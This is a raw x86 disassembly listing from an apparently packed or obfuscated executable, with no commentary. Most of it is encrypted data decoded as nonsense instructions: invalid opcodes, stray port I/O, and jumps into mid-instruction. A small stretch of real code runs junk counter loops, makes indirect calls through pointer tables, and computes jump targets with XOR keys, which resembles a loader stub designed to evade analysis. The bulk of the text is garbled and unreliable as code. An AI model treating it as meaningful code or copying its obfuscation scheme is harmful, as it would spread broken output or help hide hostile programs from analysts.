  402893:	add    DWORD PTR [eax-0x7da4293d],ecx
  402899:	es (bad) 
  40289b:	lds    esi,FWORD PTR [edi+0xa]
  40289e:	adc    al,0x24
  4028a0:	aam    0x4c
  4028a2:	and    al,0x71
  4028a4:	mov    ds:0x47e84634,eax
  4028a9:	inc    ebx
  4028aa:	cli    
  4028ab:	add    al,0x4f
  4028ad:	cmp    BYTE PTR [ecx],cl
  4028af:	lock mov ecx,DWORD PTR [ecx+edx*2-0x50]
  4028b4:	mov    cs,WORD PTR [edx]
  4028b6:	js     0x4028b2
  4028b8:	imul   ecx,DWORD PTR [edi-0x20],0x49
  4028bc:	pop    edx
  4028bd:	call   0xd660:0x86b358cf
  4028c4:	ret    
  4028c5:	mov    ch,0xd9
  4028c7:	adc    bl,BYTE PTR [ecx]
  4028c9:	bound  ebx,QWORD PTR [ebx+0x8]
  4028cc:	push   esi
  4028cd:	rol    BYTE PTR [ebx],cl
  4028cf:	jmp    0x402860
  4028d1:	ins    BYTE PTR es:[edi],dx
  4028d2:	shl    DWORD PTR [eax+0x70912fd8],1
  4028d8:	test   eax,0xb4a920cc
  4028dd:	ins    DWORD PTR es:[edi],dx
  4028de:	xchg   ebp,eax
  4028df:	or     eax,0x76e88ad8
  4028e4:	shl    DWORD PTR [edx+ecx*1-0x1a998824],1
  4028eb:	push   eax
  4028ec:	mov    BYTE PTR [ebx+0x2fcb2cac],dl
  4028f2:	pop    es
  4028f3:	loope  0x402909
  4028f5:	dec    edi
  4028f6:	(bad)  
  4028f7:	or     edi,DWORD PTR [edi]
  4028f9:	or     ebp,DWORD PTR [edx]
  4028fb:	add    al,ah
  4028fd:	pop    es
  4028fe:	adc    eax,0xa7b27587
  402903:	pop    ebx
  402904:	ret    
  402905:	or     esp,DWORD PTR [eax+0x57dde0f]
  40290b:	mov    ds,WORD PTR [edx+ebp*8]
  40290e:	pop    esp
  40290f:	frstor [ebp+0x4c]
  402912:	add    BYTE PTR [edi-0x3],ch
  402915:	or     dl,dl
  402917:	push   esi
  402918:	fnsave [edi]
  40291a:	or     DWORD PTR [edx+0x39],edx
  40291d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40291e:	push   cs
  40291f:	pop    ds
  402920:	mov    esp,0x521abe84
  402925:	or     edi,ebx
  402927:	jmp    0x44b30564
  40292c:	mov    cl,0x98
  40292e:	dec    edx
  40292f:	mov    ecx,0x4e2d6442
  402934:	mov    edi,0xc23be099
  402939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40293a:	or     edi,DWORD PTR [ecx-0x62]
  40293d:	sbb    eax,0xa284ac9c
  402942:	pop    ss
  402943:	mov    esi,0xc6067be1
  402948:	add    BYTE PTR [edx-0x224fe1cc],dl
  40294e:	nop
  40294f:	push   ds
  402950:	inc    edi
  402951:	enter  0xa3df,0xa1
  402955:	ds nop
  402957:	mul    BYTE PTR [edx+0x77]
  40295a:	dec    ecx
  40295b:	fild   QWORD PTR [esi+edx*8+0x3dcd2af5]
  402962:	mov    al,0xa
  402964:	das    
  402965:	mov    bh,0x85
  402967:	pop    esi
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fddd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e7ef
  402988:	sbb    DWORD PTR ds:0x42e813,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fde9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fde9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fde9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e22c
  4029bc:	push   0x42e803
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e54f
  4029cc:	mov    edx,DWORD PTR ds:0x42fde9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fde9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e7ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e7ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e7ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e3d3
  402a0d:	cmp    DWORD PTR ds:0x42e7ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e7ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e7ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e7ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e7ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42feae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fdd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fe0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e228,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e228,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e228
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e228,edi
  402a94:	cmp    DWORD PTR ds:0x42e228,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e228,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e241
  402ab3:	call   DWORD PTR ds:0x42e553
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0xfc0758d5
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x3a70707e
  402afd:	and    al,0xe
  402aff:	jo     0x402a8c
  402b01:	call   0x3a95:0x358b6f3b
  402b08:	fmul   QWORD PTR [edi-0x1ebed7c4]
  402b0e:	mov    edi,0xf5d3ca48
  402b13:	mov    al,ds:0x50d8a6c4
  402b18:	test   BYTE PTR [esi-0x50],0x8a
  402b1c:	scas   al,BYTE PTR es:[edi]
  402b1d:	fldcw  WORD PTR [edi]
  402b1f:	cdq    
  402b20:	dec    eax
  402b21:	repz jbe 0x402adb
  402b24:	xor    edi,DWORD PTR [ebp-0xb69ca37]
  402b2a:	leave  
  402b2b:	stos   BYTE PTR es:[edi],al
  402b2c:	rcr    DWORD PTR [edi+0x5],1
  402b2f:	jo     0x402b8c
  402b31:	in     al,0x2
  402b33:	mov    ebx,0xbab5dbfe
  402b38:	jns    0x402b34
  402b3a:	xlat   BYTE PTR ds:[ebx]
  402b3b:	pop    es
  402b3c:	or     DWORD PTR [esi-0x65f1b210],ebx
  402b42:	mov    ch,0x47
  402b44:	aam    0xa9
  402b46:	mov    esp,0x634cece9
  402b4b:	inc    eax
  402b4c:	add    ch,dl
  402b4e:	mov    BYTE PTR ds:0x67cd631d,ah
  402b54:	imul   esi,DWORD PTR [eax+0x5e],0x2cad0f81
  402b5b:	(bad)  
  402b5c:	(bad)  
  402b5d:	cli    
  402b5e:	adc    eax,0x1f6c54a1
  402b63:	(bad)  
  402b64:	mov    ebx,0xec56fb21
  402b69:	aam    0x79
  402b6b:	addr16 retf 0x2190
  402b6f:	loopne 0x402b7e
  402b71:	add    DWORD PTR [ebx],ebx
  402b73:	(bad)
  402b77:	cld    
  402b78:	push   esi
  402b79:	xchg   ecx,eax
  402b7a:	mov    edx,ebp
  402b7c:	rcl    BYTE PTR [esi],0xff
  402b7f:	in     eax,dx
  402b80:	(bad)  
  402b81:	push   ebp
  402b82:	pop    ebx
  402b83:	sbb    al,0x88
  402b85:	sahf   
  402b86:	leave  
  402b87:	jmp    0x402b86
  402b89:	inc    edi
  402b8a:	jle    0x402bea
  402b8c:	xchg   edx,eax
  402b8d:	hlt    
  402b8e:	int    0x5e
  402b90:	imul   esi,DWORD PTR [edx],0xd061baa8
  402b96:	xchg   ebp,eax
  402b97:	mov    BYTE PTR fs:[ecx-0x7e],dh
  402b9b:	add    DWORD PTR [ebx-0x4452e6d7],0xffffff9c
  402ba2:	adc    bx,WORD PTR [ebp-0x2a360be3]
  402ba9:	jmp    0xcb99dbd4
  402bae:	sbb    eax,0x6ded118c
  402bb3:	mov    BYTE PTR [ecx-0x66],cl
  402bb6:	retf   0xe60e
  402bb9:	ins    BYTE PTR es:[edi],dx
  402bba:	arpl   WORD PTR [edx+0x33],dx
  402bbd:	push   0x56
  402bbf:	pop    es
  402bc0:	hlt    
  402bc1:	adc    DWORD PTR [ecx],0x3
  402bc4:	mov    ch,0xee
  402bc6:	out    dx,eax
  402bc7:	adc    al,0x11
  402bc9:	pop    eax
  402bca:	fs mov edx,0x33e2b325
  402bd0:	icebp  
  402bd1:	and    eax,0x33fa069d
  402bd6:	mov    DWORD PTR [ebp-0x9],ebp
  402bd9:	jne    0x402b5d
  402bdb:	cmp    DWORD PTR ds:0x7d71759b,ecx
  402be1:	mov    ecx,0xa91ed97d
  402be6:	xor    esi,DWORD PTR cs:0x73bdcca
  402bed:	mov    eax,ds:0x5f372d2
  402bf2:	out    dx,al
  402bf3:	mov    es,WORD PTR [esi+ebp*2-0x33]
  402bf7:	xchg   esi,eax
  402bf8:	cld    
  402bf9:	add    BYTE PTR [ecx],0x47
  402bfc:	sti    
  402bfd:	les    esp,FWORD PTR [ebp+ecx*8-0xba3044f]
  402c04:	and    esi,edx
  402c06:	push   ebx
  402c07:	cmp    eax,0xcf904d11
  402c0c:	and    al,0xe7
  402c0e:	add    ah,ch
  402c10:	in     eax,0xe5
  402c12:	loope  0x402c89
  402c14:	sbb    al,0x8d
  402c16:	sahf   
  402c17:	xor    al,0xa6
  402c19:	mov    dl,dh
  402c1b:	ret    
  402c1c:	js     0x402bae
  402c1e:	sub    BYTE PTR [eax-0x3d],0x4f
  402c22:	je     0x402c5e
  402c24:	dec    ebx
  402c25:	jnp    0x402c99
  402c27:	jle    0x402c0d
  402c29:	shl    DWORD PTR [esi],0x21
  402c2c:	aas    
  402c2d:	pop    esi
  402c2e:	jb     0x402ca7
  402c30:	xchg   ecx,eax
  402c31:	fs icebp 
  402c33:	xchg   ecx,eax
  402c34:	dec    esp
  402c35:	test   BYTE PTR [edx+0x55f03568],al
  402c3b:	je     0x402c79
  402c3d:	pop    eax
  402c3e:	cwde   
  402c3f:	je     0x402c03
  402c41:	loop   0x402cbd
  402c43:	push   edx
  402c44:	sub    ecx,ebx
  402c46:	mov    al,ds:0x3b304347
  402c4b:	mov    bl,0x2
  402c4d:	and    esi,DWORD PTR ds:0x24e2259e
  402c53:	jb     0x402c7c
  402c55:	ss std 
  402c57:	xchg   DWORD PTR [esi],esp
  402c59:	daa    
  402c5a:	sub    DWORD PTR [edx-0x652d64fe],edx
  402c60:	jmp    0xcbb065b3
  402c65:	jmp    0x402ca5
  402c67:	or     DWORD PTR [edx],edi
  402c69:	sbb    al,0x79
  402c6b:	mov    ecx,0x38214fac
  402c70:	mov    ch,0xc7
  402c72:	pop    ebp
  402c73:	loopne 0x402bf5
  402c75:	(bad)  
  402c77:	adc    BYTE PTR ds:0xa130ad36,cl
  402c7d:	add    cl,al
  402c7f:	jae    0x402ca9
  402c81:	inc    esi
  402c82:	loopne 0x402c2e
  402c84:	retf   
  402c85:	cmp    ecx,ebx
  402c87:	sti    
  402c88:	rep stos DWORD PTR es:[edi],eax
  402c8a:	dec    edx
  402c8b:	ss add DWORD PTR gs:[ebp-0x4b],0x41
  402c91:	or     al,0x9e
  402c93:	das    
  402c94:	dec    esp
  402c95:	push   0xad58f620
  402c9a:	imul   ebp,ecx,0xffffffcc
  402c9d:	(bad)  
  402c9e:	cld    
  402c9f:	loopne 0x402c4b
  402ca1:	jno    0x402c6d
  402ca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ca4:	or     al,0xb4
  402ca6:	inc    ecx
  402ca7:	repz mov ah,bl
  402caa:	push   ecx
  402cab:	fnsave [eax-0x3d]
  402cae:	jmp    0x402c6f
  402cb0:	xchg   edi,eax
  402cb1:	sbb    ebx,DWORD PTR [ebx+0x95b45e2]
  402cb7:	inc    esi
  402cb8:	and    eax,0x91188902
  402cbd:	xchg   esi,eax
  402cbe:	pop    esp
  402cbf:	xor    BYTE PTR [ecx],bl
  402cc1:	add    dl,BYTE PTR [ecx+eax*2]
  402cc4:	xchg   edi,eax
  402cc5:	jbe    0x402d2a
  402cc7:	les    esp,FWORD PTR [edx-0x38b425eb]
  402ccd:	inc    edi
  402cce:	into   
  402ccf:	adc    eax,0xabde5668
  402cd4:	idiv   DWORD PTR ds:0xd5b7fd91
  402cda:	xor    al,0x27
  402cdc:	sar    BYTE PTR [esp+ecx*2-0x767a382f],0x98
  402ce4:	imul   ecx,DWORD PTR [ecx+0x4ceabaa8],0x18
  402ceb:	popf   
  402cec:	jno    0x402d13
  402cee:	hlt    
  402cef:	pop    ss
  402cf0:	sub    al,ch
  402cf2:	xor    al,0x54
  402cf4:	mov    esp,0xea21bd7
  402cf9:	shl    DWORD PTR [ecx-0x8],0x69
  402cfd:	bound  ebp,QWORD PTR [si-0x16]
  402d01:	xchg   dl,bl
  402d03:	xchg   esi,eax
  402d04:	sub    eax,0x14fbd463
  402d09:	rol    BYTE PTR [ebp-0x14a7bbd6],1
  402d0f:	(bad)  
  402d10:	shl    BYTE PTR [edi+0x7fd8ee16],1
  402d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d17:	add    bl,dl
  402d19:	pop    es
  402d1a:	add    DWORD PTR [edi-0x7e],0x40
  402d1e:	mov    eax,0xbf680ab2
  402d23:	scas   eax,DWORD PTR es:[edi]
  402d24:	aam    0x31
  402d26:	xchg   ebp,eax
  402d27:	xor    eax,0x737c3ab9
  402d2c:	dec    ecx
  402d2d:	inc    esp
  402d2e:	lahf   
  402d2f:	push   ebx
  402d30:	je     0x402d65
  402d32:	(bad)  
  402d33:	xchg   BYTE PTR [esi+ebx*2],cl
  402d36:	add    bh,al
  402d38:	dec    esi
  402d39:	jb     0x402d6f
  402d3b:	jecxz  0x402cbd
  402d3d:	sbb    BYTE PTR [ebp+0x46],dh
  402d40:	(bad)  
  402d41:	mov    DWORD PTR [edx+0x10],0x2543456e
  402d48:	add    ch,bh
  402d4a:	dec    esp
  402d4b:	mov    dl,0xe
  402d4d:	add    DWORD PTR [ebx-0x331a85b9],edx
  402d53:	dec    ebp
  402d54:	je     0x402db4
  402d56:	inc    ecx
  402d57:	nop
  402d58:	out    dx,eax
  402d59:	into   
  402d5a:	dec    eax
  402d5b:	cmc    
  402d5c:	fld    QWORD PTR [ecx-0x69]
  402d5f:	stos   DWORD PTR es:[edi],eax
  402d60:	or     edx,ecx
  402d62:	test   DWORD PTR [ecx+0x51242ee9],ecx
  402d68:	das    
  402d69:	add    eax,0x7642f8f5
  402d6e:	xchg   esp,eax
  402d6f:	mov    cl,0x1c
  402d71:	cwde   
  402d72:	or     ch,0x5
  402d75:	mov    edx,0xc6414e76
  402d7a:	loope  0x402d63
  402d7c:	mov    ds:0x4b37088f,eax
  402d81:	stos   BYTE PTR es:[edi],al
  402d82:	sub    BYTE PTR [eax+0x435072e1],bh
  402d88:	sbb    ch,BYTE PTR [esp+ecx*1-0xf664027]
  402d8f:	test   al,0x50
  402d91:	fiadd  DWORD PTR [ebp-0x1fdf3007]
  402d97:	or     esi,ebx
  402d99:	js     0x402d4f
  402d9b:	cmp    eax,0x4e186313
  402da0:	cmp    eax,0xfec687c3
  402da5:	cld    
  402da6:	pop    eax
  402da7:	je     0x402d4e
  402da9:	sbb    esp,DWORD PTR [ecx-0x33b6186]
  402daf:	dec    edi
  402db0:	xchg   DWORD PTR [esi-0x4bff2676],edx
  402db6:	jge    0x402e0d
  402db8:	inc    ebp
  402db9:	or     DWORD PTR [edx-0x5b],ecx
  402dbc:	dec    BYTE PTR [ebx-0x28c429fd]
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	add    ecx,DWORD PTR [ebx-0x6]
  402de2:	mov    al,0xbe
  402de4:	or     dh,BYTE PTR [eax+0x70]
  402de7:	mov    esi,0x270707e
  402dec:	jecxz  0x402e44
  402dee:	xchg   esi,eax
  402def:	aad    0xc
  402df1:	mov    al,0x74
  402df3:	cmc    
  402df4:	inc    ebp
  402df5:	cli    
  402df6:	mov    bl,0x63
  402df8:	or     DWORD PTR [ebx],eax
  402dfa:	jmp    0xe99a:0x2870a3b
  402e01:	nop
  402e02:	(bad)  
  402e03:	xor    eax,0x86fbd837
  402e08:	cdq    
  402e09:	pop    ebp
  402e0a:	retf   
  402e0b:	pop    edx
  402e0c:	inc    ebx
  402e0d:	mov    bh,0x36
  402e0f:	add    bl,BYTE PTR [eax-0x534174e5]
  402e15:	adc    DWORD PTR [ebx-0x32],esp
  402e18:	adc    BYTE PTR [ecx],cl
  402e1a:	clc    
  402e1b:	sub    DWORD PTR [ebp+0x3621689d],0x48
  402e22:	std    
  402e23:	test   eax,0xb1b221d
  402e28:	loop   0x402e66
  402e2a:	ret    
  402e2b:	rcr    BYTE PTR [edx+0x20],1
  402e2e:	mov    bl,0x2c
  402e30:	sbb    DWORD PTR [edx-0x4add94e2],esi
  402e36:	mov    al,0x57
  402e38:	mov    dl,0x5e
  402e3a:	dec    eax
  402e3b:	dec    ecx
  402e3c:	sub    ah,BYTE PTR [ebp+ebp*2-0x12]
  402e40:	int3   
  402e41:	outs   dx,BYTE PTR ds:[esi]
  402e42:	jecxz  0x402e92
  402e44:	hlt    
  402e45:	jo     0x402ea1
  402e47:	(bad)  
  402e48:	in     al,0x92
  402e4a:	cdq    
  402e4b:	jne    0x402ea0
  402e4d:	js     0x402e57
  402e4f:	aaa    
  402e50:	rcl    BYTE PTR [edx-0x77],cl
  402e53:	jmp    0x402e60
  402e55:	(bad)  
  402e56:	dec    ebp
  402e57:	inc    ebx
  402e58:	in     eax,dx
  402e59:	push   0xffffff9c
  402e5b:	mov    dl,0x54
  402e5d:	aad    0x6c
  402e5f:	sbb    dh,BYTE PTR [edx]
  402e61:	or     dh,dl
  402e63:	jp     0x402edc
  402e65:	mov    ah,0xdb
  402e67:	cmp    eax,0x93df7da0
  402e6c:	pop    esi
  402e6d:	retf   
  402e6e:	(bad)  
  402e6f:	iret   
  402e70:	cmp    DWORD PTR [edi],ebp
  402e72:	imul   ecx,DWORD PTR [esp+ebx*1+0x144607dc],0xade72e89
  402e7d:	mov    esp,0x4035e78f
  402e82:	fstp   TBYTE PTR [edi]
  402e84:	mov    DWORD PTR [ebp+0x2b],ecx
  402e87:	xor    BYTE PTR [esi+0x309617e],bl
  402e8d:	cmp    ecx,DWORD PTR [eax+0x24]
  402e90:	iret   
  402e91:	xchg   esi,eax
  402e92:	adc    edx,edx
  402e94:	inc    ebx
  402e95:	pop    esp
  402e96:	inc    eax
  402e97:	fst    QWORD PTR [eax-0x65]
  402e9a:	jecxz  0x402e8f
  402e9c:	mov    ds:0x20b0897,eax
  402ea1:	xchg   esp,eax
  402ea2:	data16 fld TBYTE PTR ds:0xecb1ee3f
  402ea9:	(bad)  
  402eaa:	jnp    0x402e71
  402eac:	sahf   
  402ead:	jno    0x402ed4
  402eaf:	inc    ebx
  402eb0:	push   ebp
  402eb1:	sub    eax,0xfcd60c78
  402eb6:	stos   BYTE PTR es:[edi],al
  402eb7:	pop    edx
  402eb8:	lahf   
  402eb9:	or     dl,BYTE PTR [eax]
  402ebb:	adc    BYTE PTR [ebp-0x5f5403f9],0xd8
  402ec2:	mov    esi,0x78813a7b
  402ec7:	addr16 in al,dx
  402ec9:	sub    al,BYTE PTR [eax-0x2e]
  402ecc:	fbstp  TBYTE PTR es:[bx+di-0x6]
  402ed1:	jb     0x402f4b
  402ed3:	(bad)  
  402ed4:	push   esi
  402ed5:	xor    al,al
  402ed7:	lea    eax,[esi]
  402ed9:	bound  ebx,QWORD PTR [edi]
  402edb:	cmp    DWORD PTR [ebp+0x22],ebp
  402ede:	dec    esi
  402edf:	rol    esp,cl
  402ee1:	jg     0x402f0a
  402ee3:	dec    esp
  402ee4:	mov    ebx,0x8e69ab3e
  402ee9:	enter  0x295e,0xf4
  402eed:	(bad)  
  402eee:	dec    edx
  402eef:	sub    DWORD PTR [edi-0x3d],0x887f9638
  402ef6:	(bad)  
  402ef7:	data16 jno 0x402eb1
  402efa:	dec    edx
  402efb:	sbb    BYTE PTR [esi-0x3],0x2e
  402eff:	xor    eax,0xb524bb4b
  402f04:	mov    ds:0x8abe2a25,eax
  402f09:	pop    ss
  402f0a:	in     eax,dx
  402f0b:	push   ecx
  402f0c:	jns    0x402f26
  402f0e:	ds inc esi
  402f10:	fcmovu st,st(7)
  402f12:	fwait
  402f13:	lods   eax,DWORD PTR ds:[esi]
  402f14:	mov    WORD PTR [esi-0x2bf0c93f],fs
  402f1a:	mov    eax,0x8d62c002
  402f1f:	bound  ebx,QWORD PTR [ecx-0x6a]
  402f22:	data16 mov bl,BYTE PTR [ebx+0x56a30872]
  402f29:	out    dx,al
  402f2a:	dec    eax
  402f2b:	add    al,ah
  402f2d:	sub    eax,0x49fd8648
  402f32:	or     DWORD PTR ds:0xe9bf54de,eax
  402f38:	adc    edi,DWORD PTR [edi]
  402f3a:	das    
  402f3b:	cmp    al,0x99
  402f3d:	ret    
  402f3e:	in     eax,dx
  402f3f:	mov    ah,0xd5
  402f41:	xchg   edi,eax
  402f42:	add    DWORD PTR [eax],esp
  402f44:	lods   eax,DWORD PTR ds:[esi]
  402f45:	or     DWORD PTR [edi+0x1c0f34b3],eax
  402f4b:	cs arpl si,dx
  402f4e:	imul   edi,edx,0x6a
  402f51:	ret    
  402f52:	add    dl,dh
  402f54:	jb     0x402f9e
  402f56:	mov    edx,0x4f53029c
  402f5b:	daa    
  402f5c:	xchg   ecx,eax
  402f5d:	adc    eax,0x696a4cff
  402f62:	xchg   BYTE PTR [esi-0x77],ch
  402f65:	jp     0x402eef
  402f67:	out    0x60,eax
  402f69:	adc    DWORD PTR [esi-0x41],ebp
  402f6c:	xchg   DWORD PTR [ebx],ebx
  402f6e:	jp     0x402fd9
  402f70:	cs jae 0x402f26
  402f73:	or     al,0xc2
  402f75:	push   ebp
  402f76:	loop   0x402f54
  402f78:	cmp    DWORD PTR [edi],esi
  402f7a:	mov    fs,WORD PTR [ebp-0x7f]
  402f7d:	mov    ss,WORD PTR ds:0xdf6834b4
  402f83:	lock int 0x1a
  402f86:	mov    ebx,0x201a8017
  402f8b:	sub    al,0x17
  402f8d:	jo     0x402f41
  402f8f:	ja     0x402ffc
  402f91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f92:	cld    
  402f93:	jbe    0x402f59
  402f95:	sbb    dh,BYTE PTR [esi+ebx*8-0x67]
  402f99:	push   eax
  402f9a:	stc    
  402f9b:	jae    0x402f51
  402f9d:	stos   BYTE PTR es:[edi],al
  402f9e:	jns    0x402f95
  402fa0:	cmp    cl,BYTE PTR [edx]
  402fa2:	mov    ah,0xea
  402fa4:	xor    ch,ah
  402fa6:	call   0xd9a15105
  402fab:	gs jl  0x403012
  402fae:	mov    edx,0xcf3dd548
  402fb3:	fild   DWORD PTR [esi*2-0x79343a9e]
  402fba:	test   BYTE PTR [edx+0x1c0aeaaf],ah
  402fc0:	jo     0x402fa7
  402fc2:	leave  
  402fc3:	stos   BYTE PTR es:[edi],al
  402fc4:	pop    ebx
  402fc5:	dec    edx
  402fc6:	aam    0x4e
  402fc8:	mov    edi,0x3254cedc
  402fcd:	mov    edx,0xa75b88b0
  402fd2:	mov    dh,BYTE PTR [edx-0x81db890]
  402fd8:	hlt    
  402fd9:	lea    ecx,[edx-0x38]
  402fdc:	inc    edi
  402fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fde:	jp     0x402f77
  402fe0:	gs (bad) 
  402fe2:	loopne 0x402f6d
  402fe4:	retf   0x60d4
  402fe7:	arpl   WORD PTR [ebx-0x31],di
  402fea:	mov    dl,0x43
  402fec:	jge    0x402fd7
  402fee:	fnstcw WORD PTR [ecx+0x373fa093]
  402ff4:	loopne 0x402f81
  402ff6:	push   0xddadc818
  402ffb:	cld    
  402ffc:	mov    WORD PTR [ebx-0x4d],?
  402fff:	push   ebp
  403000:	sub    DWORD PTR [edi-0x18],eax
  403003:	or     esi,DWORD PTR [edx+esi*2]
  403006:	jg     0x403012
  403008:	push   cs
  403009:	cmp    ch,BYTE PTR [esi]
  40300b:	js     0x402fb0
  40300d:	push   ebx
  40300e:	out    dx,al
  40300f:	add    ch,BYTE PTR [edi+0x4c]
  403012:	jge    0x402fce
  403014:	pop    ebx
  403015:	les    ebp,FWORD PTR [edi-0x45e8518e]
  40301b:	mov    ss,WORD PTR [ecx]
  40301d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40301f:	push   esp
  403020:	shr    ebp,1
  403022:	ds cmp al,0x65
  403025:	stos   DWORD PTR es:[edi],eax
  403026:	mov    eax,ds:0xf131dd6b
  40302b:	fmul   DWORD PTR [edi-0x1a52e48b]
  403031:	fxch   st(7)
  403033:	push   ecx
  403034:	add    DWORD PTR [edx],esp
  403036:	popa   
  403037:	push   edi
  403038:	(bad)  
  403039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40303a:	add    dl,BYTE PTR [ebx+0x37c9aa2e]
  403040:	push   ds
  403041:	es jno 0x402fdf
  403044:	and    al,0xfa
  403046:	inc    esi
  403047:	mov    esi,0x6d64febc
  40304c:	adc    dh,dl
  40304e:	in     eax,0x22
  403050:	and    BYTE PTR [edi],ah
  403052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403053:	fsubr  DWORD PTR [edx-0x1b]
  403056:	lahf   
  403057:	adc    BYTE PTR [ecx+0x2a],cl
  40305a:	xchg   ebx,eax
  40305b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40305c:	mov    eax,ds:0xb9ae20b6
  403061:	sbb    al,0x8a
  403063:	jg     0x403088
  403065:	test   DWORD PTR [eax+eax*8+0x4aca55db],0x6e2c6b28
  403070:	stos   BYTE PTR es:[edi],al
  403071:	ds mov esi,0x4ff4e7ac
  403077:	sbb    dl,BYTE PTR [esi-0x3a13883d]
  40307d:	neg    dl
  40307f:	cmp    eax,0x4bc9e3d9
  403084:	sub    BYTE PTR cs:[eax-0x46a26044],ah
  40308b:	test   al,0xef
  40308d:	stc    
  40308e:	loope  0x4030b6
  403090:	ror    ebp,1
  403092:	mov    bh,BYTE PTR [edx+ebx*1+0x6a84fe6]
  403099:	jns    0x4030c5
  40309b:	hlt    
  40309c:	nop
  40309d:	or     al,0x7c
  40309f:	mov    al,ds:0x15ec85f5
  4030a4:	test   eax,0x59ed4c28
  4030a9:	ja     0x40306d
  4030ab:	jo     0x4030c0
  4030ad:	mov    esi,0x32729c
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0x78
  4030ce:	sti    
  4030cf:	shl    DWORD PTR ds:0x707017fc,1
  4030d5:	mov    esi,0xc970707e
  4030da:	dec    edx
  4030db:	jb     0x403062
  4030dd:	pop    ds
  4030de:	push   ss
  4030df:	call   0xc2c8:0x3b50517f
  4030e6:	xchg   ebx,eax
  4030e7:	or     ebx,DWORD PTR [edi-0x67]
  4030ea:	(bad)  
  4030eb:	repz out dx,al
  4030ed:	loopne 0x403149
  4030ef:	das    
  4030f0:	push   ss
  4030f1:	ret    
  4030f2:	cmp    DWORD PTR [edx],eax
  4030f4:	shl    DWORD PTR [eax-0x6f],1
  4030f7:	je     0x4030ee
  4030f9:	cmp    BYTE PTR [ebx+eax*4],bh
  4030fc:	mov    cl,0x9b
  4030fe:	rcr    dh,cl
  403100:	xor    al,0xc0
  403102:	rol    BYTE PTR [edx+0x1],0x21
  403106:	sub    eax,0xed6a4b99
  40310b:	pop    edi
  40310c:	push   esp
  40310d:	fdiv   DWORD PTR [edx]
  40310f:	jge    0x4030c5
  403111:	(bad)  
